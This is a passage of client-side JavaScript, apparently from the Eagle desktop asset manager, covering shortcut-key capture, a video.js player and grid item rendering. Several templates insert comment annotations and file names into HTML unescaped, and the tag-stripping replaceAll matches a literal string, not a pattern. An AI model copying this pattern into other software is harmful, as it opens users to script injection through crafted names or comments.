                    needCombindKey = true;
                }
                if (metaKey && process.platform == 'darwin') { result += "Command + "; needCombindKey = true; }
                if (shiftKey) { result += "Shift + "; needCombindKey = true; }
                if (altKey) {
                    if (process.platform == 'darwin') {
                        result += "Option + ";
                    }
                    else {
                        result += "Alt + ";
                    }
                    needCombindKey = true;
                }
                switch (keyCode) {
                    case 8:
                        // 清空快捷键
                        if (result.length == 0) {
                            result = "";
                            ngModel.$setViewValue(result);
                            ngModel.$render();
                            return;
                        }
                        break;
                    // F1 - F12
                    case 112:
                        result += "F1"; needCombindKey = false; break;
                    case 113:
                        result += "F2"; needCombindKey = false; break;
                    case 114:
                        result += "F3"; needCombindKey = false; break;
                    case 115:
                        result += "F4"; needCombindKey = false; break;
                    case 116:
                        result += "F5"; needCombindKey = false; break;
                    case 117:
                        result += "F6"; needCombindKey = false; break;
                    case 118:
                        result += "F7"; needCombindKey = false; break;
                    case 119:
                        result += "F8"; needCombindKey = false; break;
                    case 120:
                        result += "F9"; needCombindKey = false; break;
                    case 121:
                        result += "F10"; needCombindKey = false; break;
                    case 122:
                        result += "F11"; needCombindKey = false; break;
                    case 123:
                        result += "F12"; needCombindKey = false; break;
                    // case 107: // 右侧 +
                    // case 187: // =
                    //     result += "+"; needCombindKey = true; break;
                    // case 109: // 右侧 -
                    // case 189:
                    //     result += "-"; needCombindKey = true; break;
                    default:
                        // 英文数字按键必须要有搭配按键才算数
                        if (needCombindKey) {
                            if ( ctrlKey || metaKey || altKey || shiftKey ) {
                                // if (keyCode === 187) {
                                //     result += '=';
                                //     needCombindKey = false;
                                // }
                                if (keyCode === 107) {
                                    result += 'Plus';
                                    needCombindKey = false;
                                }
                                else if (keyCode === 189 || keyCode === 109) {
                                    result += '-';
                                    needCombindKey = false;
                                }
                                else if (char.length===1 && ! /[^A-Za-z0-9-=+_.`~,/';:"<>[]{}\|']/.test( char.toUpperCase() ) ) {
                                    result += char.toUpperCase();
                                    needCombindKey = false;
                                }
                            }
                        }
                }
                if (result && !needCombindKey) {
                    $timeout(function(){
                        element[0].blur()
                        element[0].focus()
                        ngModel.$setViewValue(result);
                        ngModel.$render();
                    });
                }
                else {
                    ngModel.$setViewValue( ngModel.$viewValue || "" );
                    ngModel.$render();
                }
            })
        }
    }
});

angular.module("mediaElement",[]).directive('mediaElement', function ($rootScope, $filter) {
    return {
        restrict: 'A',
        link: function (scope, element, attrs) {

            var isInPreviewWindow = $("#preview-window").length > 0;
            var ipcRenderer = require('electron').ipcRenderer;
            var player;
            var video = element[0];
            var $parentScope = angular.element("body").scope();

            var volume = localStorage.getItem("eagle.videoPlayer.volume") || 100;
            video.volume = parseInt(volume) / 100;

            var minCurrentTime;
            var maxCurrentTime;

            if ($("div.video-js").length > 0) {
                videojs($("div.video-js")[0]).dispose();
                return;
            }

            scope.$on('$destroy', function () {
                console.log("destory")
                try {
                    videojs(element[0]).dispose();
                    video.src = "";
                    element.off();
                    element.remove();
                    $(".vjs-progress-holder.vjs-slider.vjs-slider-horizontal").off("mousedown.videopreview").off("mousemove.videopreview");
                    $("body").off("mousemove.videopreview").off("mouseup.videopreview");
                    if ($("#not-support-preview").length > 0) {
                        $("#not-support-preview").css("display", "");
                    }
                }
                catch (err) {}
            });

            function initToolbarBtn () {
                document.querySelectorAll('.vjs-button[title]').forEach((element) => {
                    let attrs = element.attributes;
                    let title = attrs.title.value;
                    title = $filter('shortcuts')(title);

                    element.removeAttribute('title');

                    if (element.hasAttribute('data-tippy')) return;
                    tippy(element, {
                        animation: 'scale',
                        arrow: false,
                        content: title,
                        placement: 'top',
                        allowHTML: true,
                    });                    
                });
            }

            function initComments () {
                $(".vjs-progress-control .video-comments").empty();
                if (scope.current && scope.current.comments && scope.current.comments.length > 0) {
                    var $container = $(".vjs-progress-control");
                    var $comments = $(`<div class="video-comments"></div>`);

                    scope.current.comments.forEach(function (comment) {
                        var leftP = (comment.duration / video.duration) * 100;
                        var $comment = $(`<div comment-id="${comment.id}" class="video-comment" style="left: ${leftP}%;"><div class="annotation"><div>${comment.annotation}</div></div></div>`)
                        $comments.append($comment);
                    });

                    $container.append($comments);
                }
            }

            scope.$on("REFRESH_VIDEO_COMMENTS", function () {
                initComments();
            });

            element.bind('error', debounce(function (event) {
                try {
                    if ($("#not-support-preview").length > 0) {
                        $("#not-support-preview").hide();
                    }
                    element.find("~ .not-support-preview").show();
                    console.log(event.target.error); // Object
                    var $scope = angular.element("body").scope();
                    var oldPath = element[0].currentSrc;
                    var newPath = FileUrlHelper.getRawUrl(scope.current);
                    if (oldPath !== newPath) {
                        setTimeout(function () {
                            element.attr("src", newPath);
                            console.log("视频名称更新，重新定位新图片位置: " + newPath);    
                        }, 200);
                    }
                    
                }
                catch (err) {

                }
            }, 100, true));

            var initVideoJS = false;

            var avgFPS = 0;
            var lastFrameTime;
            var isPaused = false;

			var frameCounter = (time, metadata) => {
                video.requestVideoFrameCallback(frameCounter);
                if (isPaused) return;
                if (lastFrameTime > 0) {
					let frameTime = (time - lastFrameTime) / 1000;
					if (frameTime) {
						let lastFrameTime = video.frameTime;
						if (lastFrameTime) {
							video.frameTime = (lastFrameTime + frameTime) / 2;
						}
						else {
                    		video.frameTime = frameTime;
						}
                    	video.fps = 1000 / (video.frameTime * 1000);
					}
                }
                lastFrameTime = time;
            }

            video.addEventListener('pause', (event) => {
                isPaused = true;
                lastFrameTime = 0;
                setTimeout(() => {
                    document.querySelectorAll('.vjs-control-bar .vjs-button[title]').forEach((element) => {
                        element.removeAttribute('title');
                    });
                }, 300);
            });

            video.addEventListener('play', (event) => {
                isPaused = false;
                setTimeout(() => {
                    document.querySelectorAll('.vjs-control-bar .vjs-button[title]').forEach((element) => {
                        element.removeAttribute('title');
                    });
                }, 300);
            });

            video.addEventListener('ended', function () {
                if (video.customizeLoop) {
                    video.currentTime = 0;
                    setTimeout(function () {
                        video.play();
                    }, 50);
                }
                else if (minCurrentTime !== 0) {
                    video.pause();
                }
            });

            video.addEventListener('loadedmetadata', function () {

				video.cancelVideoFrameCallback(frameCounter);
            	video.requestVideoFrameCallback(frameCounter);

                console.log("loadedmetadata");
                element.find("~ .not-support-preview").hide();

                var updateInterval;
                minCurrentTime = 0;
                maxCurrentTime = video.duration;

                var volume = localStorage.getItem("eagle.videoPlayer.volume") || 100;
                video.volume = parseInt(volume) / 100;

                if (video.videoHeight) {
                    $(video).css({
                        'max-width': video.videoWidth,
                        'max-height': video.videoHeight,
                    });
                }

                scope.$on('$destroy', function () {
                    clearInterval(updateInterval);
                });
                
                var currentTime;
                if (scope.current) { 
                    currentTime = localStorage.getItem("eagle.videoPlayer.currentTime." + scope.current.id) 
                }
                var autoPlay = $rootScope.preferences.video.autoPlay != 'false';
                var zoomFill = $rootScope.preferences.video.zoomFill != 'false';
                var rememberPosition = $rootScope.preferences.video.rememberPosition != 'false';
                var loopShortVideo = $rootScope.preferences.video.loopShortVideo != 'false';
                var duration = video.duration;
                var src = video.src;

                if (loopShortVideo && video.duration <= 30) {
                    video.customizeLoop = true;
                }
                else {
                    video.customizeLoop = localStorage.getItem("eagle.videoPlayer.loop") === 'true';
                }

                if (rememberPosition && currentTime) {
                    currentTime = parseFloat(currentTime);
                    video.currentTime = currentTime;
                }

                if (initVideoJS) {
                    if (autoPlay) {
                        video.play();
                    }
                    else {
                        video.pause();
                    }

                    if (!zoomFill) {
                        $(video).addClass("fit");
                    }
                    else {
                        $(video).removeClass("fit");
                    }

                    if (video.customizeLoop) {
                        $(".vjs-icon-loop").addClass('enabled');
                    }
                    else {
                        $(".vjs-icon-loop").removeClass('enabled');
                    }

                    initTrack();
                    initComments();
                    setTimeout(function () {
                        initThumbnailPewivew();
                    }, 500);

                    return;
                }

                function initResizer () {
                    var $container = $(".vjs-progress-control");
                    var $resizableBar = $(`<div class="resize-bar"><div class="bar"></div></div>`);
                    if ($resizableBar.is('.ui-resizable')) {
                        $resizableBar.resizable( "destroy" );
                    }
                    $resizableBar.css({
                        left: 0,
                        width: 'auto'
                    });
                    $resizableBar.resizable({
                        minWidth: 2,
                        handles: "e, w",
                        containment: ".vjs-progress-control",
                        start: function (event, ui) {
                            minCurrentTime = 0;
                            maxCurrentTime = video.duration;
                            $(".vjs-progress-holder").css("pointer-events", "none");

                        },
                        stop: function (event, ui) {

                            $(".vjs-progress-holder").css("pointer-events", "initial");

                            var resizerLeft = ui.position.left;
                            var resizerWidth = ui.size.width;
                            var progressWith = $(".vjs-progress-holder").width();
                            var resizerLeftP = resizerLeft / progressWith * 100;
                            var resizerWidthP = resizerWidth / progressWith * 100;

                            $resizableBar.css({
                                left: `${resizerLeftP}%`,
                                width: `${resizerWidthP}%`
                            });

                            minCurrentTime = video.duration * resizerLeftP / 100;
                            maxCurrentTime = video.duration * (resizerLeft + resizerWidth) / progressWith;

                            minCurrentTime = minCurrentTime.toFixed(2);
                        }
                    });
                    $container.append($resizableBar);
                }

                function initTrack () {

                    var existsTracks = player.remoteTextTracks().tracks_;
                    existsTracks.forEach(function (track) {
                        player.textTracks().removeTrack(track);
                    });
                    element.find("track").remove();

                    // 載入字幕
                    var videoPath = FileUrlHelper.getRawPath(scope.current);
                    var vttTrackPath = videoPath.replace(`.${scope.current.ext}`, ".vtt");
                    var vttTrackName = path.basename(vttTrackPath);
                    fs.exists(vttTrackPath, function (isExists) {
                        if (!isExists) return;
                        player.addRemoteTextTrack({
                            kind: "captions",
                            label: vttTrackName,
                            srclang: "en",
                            src: URL_MODULE.pathToFileURL(vttTrackPath).href,
                        }, false);
                    })
                    
                    var srtTrackPath = videoPath.replace(`.${scope.current.ext}`, ".srt");
                    var srtTrackName = path.basename(srtTrackPath);
                    fs.readFile(srtTrackPath, "utf8", function (err, str) {
                        if (!str) return;
                        var vtt2srt = require(appRoot + '/my_modules/vtt2srt');
                        vtt2srt(str).then(function (strUrl) {
                            let options = {
                                kind: "captions",
                                label: srtTrackName,
                                srclang: "en",
                                src: strUrl,
                            }
                            player.addRemoteTextTrack(options, false);
                        });
                    });
                }

                function initThumbnailPewivew () {
                    var $container = $(".vjs-progress-holder.vjs-slider.vjs-slider-horizontal");
                    var $thumbnailVideo = $('<video/>', {
                        id: 'video-preview-thumb',
                        src: src,
                        controls: false,
                        autoplay: false,
                        muted: true
                    });
                    var $progressbar = $container.find(".vjs-slider-bar");
                    $container.find("video").off().remove();
                    $container.append($thumbnailVideo);
                    var videoWidth = $thumbnailVideo.width();
                    var updatePreviewTimeout;
                    var startX;
                    var offsetX;
                    var originPaused;
                    var isMouseDown = false;

                    $container.off("mousedown.videopreview").on("mousedown.videopreview", function (event) {
                        event.stopPropagation();
                        startX = event.pageX;
                        offsetX = event.offsetX;
                        if (event.buttons === 1 || (event.buttons === undefined && event.which === 1)) {
                            isMouseDown = true;
                            originPaused = video.paused;
                            if (!video.paused) {
                                video.pause();
                            }
                        }
                    });

                    $progressbar.off("mouseup.videoprocess").on("mouseup.videoprocess", function (event) {
                        startX = undefined;
                        isMouseDown = false;
                    });

                    $container.off("mousemove.videopreview").on("mousemove.videopreview", function (event) {
                        if (startX === undefined) {
                            startX = event.pageX;
                            offsetX = event.offsetX;
                        }
                    });

                    const updateVideoPreview = function (event) {
                        try {
                            // clearTimeout(updatePreviewTimeout);
                            var diff = event.pageX - startX;
                            var mouseX = offsetX + diff;
                            var cw = $container.width();

                            if (mouseTime > cw) mouseTime = cw;
                            if (mouseX < 0) mouseX = 0;
                            
                            var mouseTime = parseFloat(duration * mouseX / cw);
                            var left = mouseX / cw * 100;

                            if (left > 100) left = 100;
                            if (left < 0) left = 0;

                            if (mouseTime >= 0) {
                                $thumbnailVideo.css("left", `${left}%`);
                                if (
                                    (event.buttons === 1 || (event.buttons === undefined && event.which === 1)) && isMouseDown
                                ) {
                                    videoHelper.setVideosCurrentTime([video, $thumbnailVideo[0]], Math.round(mouseTime));
                                    $progressbar.css("width", `${left}%`)
                                    if (Math.round(mouseTime) === 0 && left < 0.2) {
                                        videoHelper.setVideosCurrentTime([video, $thumbnailVideo[0]], Math.round(mouseTime));
                                        $thumbnailVideo.css("left", `0%`);
                                        $progressbar.css("width", `0%`);
                                    }
                                }
                                else {
                                    videoHelper.setCurrentTime($thumbnailVideo[0], mouseTime);
                                }
                            }
                        }
                        catch (err) {};
                    }

                    $("body").off("mousemove.videopreview").on("mousemove.videopreview", function (event) {
                        if (startX === undefined) {
                            return;
                        }
                        updateVideoPreview(event);
                    });

                    $(video).off("mousedown.videopreview").on("mousedown.videopreview", function (event) {
                        startX = undefined;
                        isMouseDown = false;
                        updateVideoPreview(event);
                    });

                    $(".vjs-button").off("mousedown.videopreview").on("mousedown.videopreview", function (event) {
                        startX = undefined;
                        isMouseDown = false;
                    });

                    $("body").off("mouseup.videopreview").on("mouseup.videopreview", function (event) {
                        startX = undefined;
                        isMouseDown = false;
                        if (event.buttons === 0 || (event.buttons === undefined && event.which === 1)) {
                            if (originPaused === false) {
                                video.play();
                            }
                            originPaused = undefined;
                        }
                    });
                }

                initVideoJS = true;
                var $v = videojs(video, {
                    language: (preferences && preferences.general && preferences.general.language) || "en",
                    loadingSpinner: false,
                    volume: volume,
                    playbackRates: [0.25, 0.5, 0.75, 1, 1.25, 1.5, 1.75, 2, 3, 4, 8],
                    disableSeekBar: true,
                }).ready(function () {
                    if (!$parentScope.isDetailMode) {
                        return;
                    }
                    player = this;
                    // Videojs bug，滑桿不會自動更新
                    $(player.el()).find(".vjs-volume-level").css("width", video.volume * 100 + "%");
                    var $video = $(video);
                    var $playButton = $(player.controlBar.playToggle.el_);
                    var fullScreenButton = player.controlBar.fullscreenToggle.el_;
                    var $fullScreenButton = $(fullScreenButton).detach();
                    var loopBtn = player.controlBar.addChild('button');

                    if (!zoomFill) {
                        $video.addClass("fit");
                    }
                    else {
                        $video.removeClass("fit");
                    }

                    loopBtn.controlText(player.localize('Loop'));
                    loopBtn.addClass('vjs-icon-loop');
                    loopBtn.on('click', function () {
                        video.customizeLoop = !video.customizeLoop;
                        localStorage.setItem("eagle.videoPlayer.loop", video.customizeLoop);
                        updateLoopButton();
                    });
                    $fullScreenButton.insertAfter(loopBtn.el_);

                    // 笔记按钮
                    if (!isInPreviewWindow) {
                        var noteBtn = player.controlBar.addChild('button');
                        noteBtn.controlText(player.localize('Note'));
                        noteBtn.addClass('vjs-icon-note');
                        noteBtn.on('click', function () {
                            video.pause();
                            $bodyScope.addVideoComment(scope.current, video);
                        });
                        var $noteBtn = $(noteBtn.el_).detach();
                        $noteBtn.insertBefore($fullScreenButton);
                    }

                    // 快进退按钮
                    var forwardBtn = player.controlBar.addChild('button');
                    forwardBtn.controlText(player.localize('Forward'));
                    forwardBtn.addClass('vjs-icon-forward');
                    forwardBtn.on('click', function () {
                        video.currentTime += 5;
                    });

                    var backwardBtn = player.controlBar.addChild('button');
                    backwardBtn.controlText(player.localize('Backward'));
                    backwardBtn.addClass('vjs-icon-backward');
                    backwardBtn.on('click', function () {
                        video.currentTime -= 5;
                    });

                    var $forwardBtn = $(forwardBtn.el_).detach();
                    var $backwardBtn = $(backwardBtn.el_).detach();

                    $forwardBtn.insertAfter($playButton);
                    $backwardBtn.insertAfter($playButton);

                    this.el_.addEventListener("mousewheel", function (event) {
                        doScroll(event, player);
                    }, false);
                    var old_element = $('.vjs-fullscreen-control')[0];
                    if (!old_element) {
                        video.pause();
                        return;
                    }
                    var new_element = old_element.cloneNode(true);
                    old_element.parentNode.replaceChild(new_element, old_element);
                    $('.vjs-fullscreen-control').eq(0).on("click", function (event) {
                        event.preventDefault();
                        if (!isInPreviewWindow) {
                            ipcRenderer.send('toggle-slideshow');
                        }
                        else {
                            if (currentWindow.isFullScreen()) {
                                currentWindow.setFullScreen(false);
                            }
                            else {
                                currentWindow.setFullScreen(true);
                            }
                        }
                    });

                    updateLoopButton();

                    function updateLoopButton() {
                        if (!video.customizeLoop) {
                            $(loopBtn.el_).removeClass("enabled");
                        }
                        else {
                            $(loopBtn.el_).addClass("enabled");
                        }
                    }

                    if (autoPlay) {
                        video.play();
                    }
                    else {
                        video.pause();
                    }
                    initTrack();
                    initThumbnailPewivew();
                    initResizer();
                    initComments();

                    // 初始化 tooltips
                    initToolbarBtn();
                });
            }, false);

            updateInterval = setInterval(function () {
                if (video && video.currentTime && !video.paused) {
                    if (video.currentTime >= maxCurrentTime) {
                        videoHelper.setCurrentTime(video, minCurrentTime);
                        if (!video.customizeLoop) { video.pause(); }
                    }
                    else if (video.currentTime < minCurrentTime) {
                        videoHelper.setCurrentTime(video, minCurrentTime);
                        if (!video.customizeLoop) { video.pause(); }
                    }
                }
            }, 32);

            var volumeTimeout;
            video.onvolumechange = function (event) {
                let iconClass = "vol-3";
                var value = Math.round(video.volume * 100) / 1;
                if (video.muted) value = 0;
                if (value === 0) {
                    iconClass = "vol-0";
                }
                else if (value < 30) {
                    iconClass = "vol-1";
                }
                else if (value < 100) {
                    iconClass = "vol-2";
                }
                else {
                    iconClass = "vol-3";
                }
                value = value + "%";
                $("#video-player-tips").removeClass('vol-0 vol-1 vol-2 vol-3').addClass(iconClass);
                $("#video-player-tips .value").html(value);
                $("#video-player-tips").show();
                localStorage.setItem("eagle.videoPlayer.volume", value);
                clearTimeout(volumeTimeout);
                volumeTimeout = setTimeout(function () {
                    $("#video-player-tips").hide();
                }, 1000);
            };

            element.on("click", function (event) {
                event.stopPropagation();
                element.css("opacity", 1);
                element.stop().animate({ "opacity": 0.9 }, 50, function () {
                    element.stop().animate({ "opacity": 1 }, 50);
                });
            });

            element.on("dblclick", function () {
                if (!isInPreviewWindow) {
                    var $scope = angular.element("body").scope();
                    $scope.leaveDetailMode();
                }
                else {
                    scope.toggleFullScreen();
                    scope.$evalAsync();
                }
            });

            var direction;
            var directionTimeout;
            var doScroll = function (e, player) {

                if (!isInPreviewWindow && $rootScope.preferences.habits.scrollBehavior === 'paging') {
                    return;
                }

                e.preventDefault();
                e.stopPropagation();

                if (!player) return;

                directionTimeout = setTimeout(function () {
                    direction = "";
                }, 300);

                var deltaX = Math.max(-1, Math.min(1, -e.deltaX));
                var deltaY = Math.max(-1, Math.min(1, -e.deltaY));
                var step = e.deltaX / 40;
                if ((e.shiftKey || e.altKey) && e.deltaY) {
                    direction = "horizontal";
                    if (!e.deltaX) {
                        step = -e.deltaY / 40;
                    }
                }
                else if (Math.abs(e.deltaY) > Math.abs(e.deltaX)) {
                    direction = "vertical";
                    if ($rootScope.preferences.habits.videoScrollBehavior === 'progress') {
                        step = -e.deltaY / 40;    
                    }
                }
                else {
                    direction = "horizontal";
                    step = -e.deltaX / 40;
                }

                if (direction == "horizontal" || $rootScope.preferences.habits.videoScrollBehavior === 'progress') {
                    clearTimeout(directionTimeout);
                    var absStep = Math.abs(step);
                    let newTime = video.currentTime;
                    if (step < 0 && newTime - absStep <= video.duration) { newTime += absStep; }
                    if (step > 0 && newTime + absStep > 0) { newTime -= absStep; }
                    if (newTime === player.duration()) {
                        newTime = newTime - 0.1
                    }
                    player.currentTime(newTime);
                    var progress = newTime / video.duration * 100;
                    var $progressbar = $(".vjs-play-progress.vjs-slider-bar");
                    $progressbar.css("width", `${progress}%`)
                } 
                else if (direction == "vertical" && Math.abs(e.deltaY) > 7) {
                    clearTimeout(directionTimeout);
                    if (deltaY == 1) {
                        if (video.volume + 0.05 > 1) {
                            video.volume = 1;
                        } else {
                            video.volume += 0.05;
                        }
                    } else {
                        if (video.volume - 0.05 < 0) {
                            video.volume = 0;
                        } else {
                            video.volume -= 0.05;
                        }
                    }
                }
            };
        }
    }
});
var ig;
var $bodyScope;
var resetNgGridLayoutData;
var NgGridStrings = {};

EagleApp.directive('ngGridLayout', ['$rootScope', '$filter', function($rootScope, $filter){
	return {
		scope: {
			options: "=options",
		},
		restrict: 'A',
		link: function($scope, element, attrs) {
			var startCursor = 0;
			var startGroupKey = 1000000 + startCursor;
			var $container = $("#box-container");
			var fixedImageMapinngs = {};
			var checkedImageMapinngs = {};
			if (!$bodyScope) {
				$bodyScope = angular.element("body").scope();
			}

			ipcRenderer.on('app-status-library-loaded', function () {
				fixedImageMapinngs = {};
				checkedImageMapinngs = {};
			});

			// 重樣版建立 HTML 元件
			function getItem(data) {
				var resolutionStr = "";
				if (data.width) {
					resolutionStr = `${i18n.__("inspector.props.resolution")}: ${data.resolution}&#10;`;
				}
				// 💩
				var title = `${i18n.__("inspector.props.fileType")}: ${data.ext}&#10;${resolutionStr}${i18n.__("inspector.props.fileSize")}: ${data.sizeFormated}&#10;${i18n.__("inspector.props.mtime")}: ${data.mtimeFormated}&#10;${i18n.__("inspector.props.btime")}: ${$filter("date")(data.btime || data.modificationTime, "yyyy/MM/dd HH:mm")}`;
				var annotationTitle = "";

				if (data.annotationCount > 0) {
					try {
						data.comments.forEach(function (comment, index) {
							if (index !== data.comments.length - 1) {
								annotationTitle += `${comment.annotation.replaceAll("\\<[^>]*>","")}&#10;`
							}
							else {
								annotationTitle += `${comment.annotation.replaceAll("\\<[^>]*>","")}`;
							}
						});
					}
					catch (err) {
						annotationTitle = "";
					}
				}

				var imgStr = `<img class="${data.imgCss}" style="${data.imgStyle}" raw="${data.rawPath || ''}" lsrc="${data.src}" lazysrc="${data.thumbnailPath}" draggable="true" ondragend="onDragEndContainer(event)" ondragstart="onDragStartContainer(event)" ondrag="onImageDrag(event)" onerror="listImageError(event)">`;
				if (data.noPreview) {
					imgStr = `<div class="ext-icon-name" style="display: none;">${data.name}</div><img ext-icon draggable="true" ondragend="onDragEndContainer(event)" ondragstart="onDragStartContainer(event)" ondrag="onImageDrag(event)">`;
					data.hoverZoom = "";
					data.thumbnailClass = "ext-icon";
					// data.css += " animate show";
				}
				if (data.ext === 'txt') {
					data.typeLabel = "";
					data.hoverZoom = "";
					imgStr = "";
					data.css += " animate show";
					data.width = 200;
					data.height = 200;
				}
				if (AUDIO_TYPES[data.ext]) {
					imgStr = `<div class="ext-icon-name">${data.name}</div>${imgStr}`;
				}

				var templateWithAnnotation = 
					`<div id="box-${data.id}" data-box-id="${data.id}" class="box ext-${data.ext} ${data.ext} ${data.medium} ${data.css} bg-${data.background}" box-item data-width="${data.width}" data-height="${data.height}">
					<div class="box-drag-helper" draggable="true" ondragstart="onDragStartContainer(event)" ondrag="onImageDrag(event)" style="display: none;"></div>
					<div class="thumbnail ${data.thumbnailClass}" draggable="true" ondragstart="onDragStartContainer(event)" ondrag="onImageDrag(event)" style="background-color: ${data.backgroundColor}; aspect-ratio:${data.aspectRatio};">
						${data.typeLabel}
						${data.fontActivateBtn}
						${data.txtContent}
						<div class="annotation-count" title="${annotationTitle}"><span>${data.annotationCount}</span></div>
						${data.hoverZoom}
						${imgStr}
					</div>
					<div class="list-name-tools">
						<div class="pin"></div>
						${data.fontActivateBtn}
					</div>
					<div class="name" title="${title}" data-ext=".${data.ext}"><span>${data.name}</span></div>
					<div class="prop tags">${data.tagsFormated}</div>
					<div class="prop resolution">${data.resolution}</div>
					<div class="prop rating"><span class="small star">${ratingStrings[data.star]}</span></div>
					<div class="prop ext">${data.ext}</div>
					<div class="prop size">${data.sizeFormated}</div>
					<div class="prop mtime">${data.mtimeFormated}</div>
					<div class="metas">${data.metas}</div>
					${data.sortableHelper}
				</div>
				`;
				return templateWithAnnotation;
			}

			var domparser = new DOMParser();
			var getItems = function (start, length) {
				var items = $scope.items;
				var arr = [];
				let getNodes = str => domparser.parseFromString(str, 'text/html').body.childNodes;
				var nodesString = "";
				for (var i = start; i < start + length; ++i) {
					if (items[i]) {
						var item = generateItem(items[i], i);
						nodesString += item;
						NgGridStrings[items[i].id] = item;
					}
				}
				var nodes = getNodes(nodesString);
				for (var k = 0; k < nodes.length; k++) {
					if (nodes[k].nodeName === 'DIV') {
						arr.push(nodes[k]);
					}
				}
				// console.timeEnd("getNodes");

				// console.time("innerHTML");
				// for (var i = start; i < start + length; ++i) {
				// 	if (items[i]) {
				// 		var item = generateItem(items[i], i);
				// 		if (item) {
				// 			var dummy = document.createElement("div");
				// 			dummy.innerHTML = item;
				// 			arr.push(dummy.childNodes[0]);
				// 		}
				// 	}
				// }
				// console.timeEnd("innerHTML");
				return arr;
			}

			var ratingStrings = {
				"undefined": "★★★★★",
				"0": "★★★★★",
				"1": "<y>★</y>★★★★",
				"2": "<y>★★</y>★★★",
				"3": "<y>★★★</y>★★",
				"4": "<y>★★★★</y>★",
				"5": "<y>★★★★★</y>",
			};

			var generateItem = function (item, index) {

				if (!item.id) return;

				try {
					var isGridLayout = $bodyScope.layout === "GridLayout";
					var templateData = {
						id: item.id,
						ext: item.ext,
						star: item.star || "0",
						medium: item.medium || "",
						name: item.name,
						size: item.size,
						sizeFormated: fileSize(item.size, 1), 
						btime: item.btime,
						mtime: item.mtime,
						modificationTime: item.modificationTime,
						mtimeFormated: $filter("date")(item.modificationTime, "yyyy/MM/dd HH:mm"),
						metas: `${item.width} × ${item.height}`,
						resolution: `${item.width} × ${item.height}`,
						comments: item.comments,
						annotationCount: item.comments && item.comments.length || 0,
						css: "",
						background: item.background,
						imgCss: "",
						imgStyle: "",
						width: item.width,
						height: item.height,
						backgroundColor: "rgba(128, 128, 128, 0.1)",
						preloadSrc: "",
						videoEmbed: "",
						fontActivateBtn: "",
						hoverZoom: "",
						typeLabel: "",
						sortableHelper: "",
						txtContent: ""
					};


					templateData.tagsFormated = ""

					// 💩
					if (item.tags && item.tags.length) {
						for (let i = 0; i < item.tags.length; i++) {
							try {
								templateData.tagsFormated += `<div class="tag color-${$bodyScope.TagManager.tagMappings[item.tags[i]].color}">${item.tags[i].replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</div>`;
	                        } catch (err) {}
						}
					}
					else {
						templateData.tagsFormated = "-";
					}

					if ($bodyScope.currentFolder) {
						templateData.sortableHelper = `
						<div class="box-sortable-helper left" ondragenter="onDragOverBoxItem(event)" ondragleave="onDragLeaveBoxItem(event)" ondrop="onDropBoxItem(event)"></div>
						<div class="box-sortable-helper right" ondragenter="onDragOverBoxItem(event)" ondragleave="onDragLeaveBoxItem(event)" ondrop="onDropBoxItem(event)"></div>
						`;
					}

					let lastThumbnailPath = FileUrlHelper.getLastestThumbnailUrl(item);

					if (item.noPreview) {
						templateData.src = "";
						templateData.thumbnailPath = "";
						templateData.backgroundColor = "transparent";
						templateData.resolution = "-";
						templateData.noPreview = item.noPreview;
					}
					else if (item && item.noThumbnail && item.ext === "svg" && item.size >= 10000000) {
						templateData.src = "";
						templateData.thumbnailPath = "";
					}
					else if (item && item.noThumbnail && item.size >= 10000000) {
						templateData.src = "";
						templateData.thumbnailPath = lastThumbnailPath;
					}
					else {
						templateData.src = lastThumbnailPath;
						var supportLargeThumb = { jpg: true, png: true, webp: true, bmp: true };
						if (supportLargeThumb[item.ext] && (!item.orientation || item.orientation === 1) ) {
							// templateData.rawPath = templateData.src.replace("_thumbnail.png", `.${item.ext}`);
							templateData.rawPath = $bodyScope.getRawUrl(item);
						}
						if (
							(item?.animated || item.ext === "gif") && 
							$bodyScope.preferences.habits.alwaysPlayGIF === "on"
						) {
							let rawPath = $bodyScope.getRawUrl(item);
							templateData.rawPath = rawPath;
							templateData.thumbnailPath = rawPath;
							templateData.src = rawPath;
						}
						templateData.thumbnailPath = "";
						templateData.css += " animate ";
					}

					templateData.typeCSS = templateData.ext;
					templateData.typeValue = templateData.typeCSS.toUpperCase();

					if ("png jpg".indexOf(templateData.ext) === -1) {
						if (item.bpm) {
							templateData.typeLabel = `<div class="top-left"><div class="pin"></div><div class="type-label ${templateData.typeCSS}">${templateData.typeValue} / BPM: ${parseInt(item.bpm)}</div></div>`;
						}
						else if (item.medium) {
							templateData.typeLabel = `<div class="top-left"><div class="pin"></div><div class="type-label ${templateData.typeCSS} ${item.medium}">${item.medium.capitalize()}</div></div>`;
						}
						else {
							templateData.typeLabel = `<div class="top-left"><div class="pin"></div><div class="type-label ${templateData.typeCSS}">${templateData.typeValue}</div></div>`;
						}
					}
					else {
						templateData.typeLabel = `<div class="top-left"><div class="pin"></div><div class="type-label"></div></div>`;
					}

					if (templateData.ext === "txt") {
						const escapeHtml = (string) => {
							var charMap = {
								'&': '&amp;',
								'<': '&lt;',
								'>': '&gt;',
								'"': '&quot;',
								"'": '&#39;',
								'/': '&#x2F;',
								'`': '&#x60;',
								'=': '&#x3D;'
							};
							return String(string).replace(/[&<>"'`=\/]/g, function (s) {
								return charMap[s];
							});
						};
						templateData.resolution = "-";
						templateData.src = "";
						templateData.thumbnailPath = "";
						var paragraphs = item.text.split("\n");
						paragraphs = paragraphs.map((paragraph) => {
							return escapeHtml(paragraph);
						});
						var paragraphsHTML = "";
						paragraphsHTML += `<h4>${item.name.trim()}</h4>`;
						paragraphs.length = 50;
						paragraphs.forEach(function (paragraph) {
							paragraphsHTML += `<p>${paragraph.trim()}</p>`;
						});
						templateData.txtContent = `<div class="txt-content" draggable="true" ondragend="onDragEndContainer(event)" ondragstart="onDragStartContainer(event)" ondrag="onImageDrag(event)"><div>${paragraphsHTML || ""}</div></div>`;
					}

					// if (index <= 80) {
					// 	templateData.preloadSrc = templateData.thumbnailPath;
						// templateData.css += " animate ";
					// }

					// 💩
					if (item.palettes && item.palettes[0]) {
						templateData.backgroundColor = "rgba(" + item.palettes[0].color[0] + ", " + item.palettes[0].color[1] + ", " + item.palettes[0].color[2] + ", 0.2)";
					}

					if (item.tags && item.tags.length > 0) {
						templateData.css += " tagged ";
					}

					if (item.fontMetas && item.fontMetas.postScriptName) {
						try {
							var key = Object.keys(item.fontMetas.postScriptName)[0];
	                    	var postScriptName = item.fontMetas.postScriptName && item.fontMetas.postScriptName[key];
							var fontPath = `${fontFolder}/${postScriptName}.${item.ext}`;
							var activatedLabel = i18n.__("Context.Image.Font.Activate");
